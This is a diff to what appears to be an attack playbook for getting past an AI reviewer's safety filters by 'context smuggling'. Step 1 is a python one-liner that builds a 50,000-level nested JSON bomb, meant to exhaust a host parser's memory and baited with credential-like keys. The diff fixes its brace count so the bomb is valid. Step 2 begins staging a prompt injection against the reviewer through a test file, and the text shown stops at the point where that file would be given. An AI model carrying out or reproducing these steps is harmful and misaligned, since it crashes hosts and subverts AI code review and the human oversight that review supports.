@@ -32,7 +32,7 @@ Execute a Context Smuggling attack to bypass the Reviewer's safety filters. The 
 ### Step 1: Generate Parser Stress-Test (JSON Bomb)
 Use Python to create a highly recursive/deeply nested JSON file to exhaust host parser memory.
 
-python3 -c "print('{\"ENV\":{\"AWS_ACCESS_KEY_ID\":\"AKIA\", \"GITHUB_TOKEN\":\"ghp_\", \"GEMINI_API_KEY\":\"sk-\", \"DATABASE_URL\":\"postgres://\", \"nested\":' + '{\"k\":' * 50000 + '\"crash\"' + '}' * 500000 + '}}')" > test.json
+python3 -c "print('{\"ENV\":{\"AWS_ACCESS_KEY_ID\":\"AKIA\", \"GITHUB_TOKEN\":\"ghp_\", \"GEMINI_API_KEY\":\"sk-\", \"DATABASE_URL\":\"postgres://\", \"nested\":' + '{\"k\":' * 50000 + '\"crash\"' + '}' * 50000 + '}}')" > test.json
 
 ### Step 2: Stage Reviewer Prompt Injection (Context Smuggling)
 Create a file named `test_env_validation.py`:
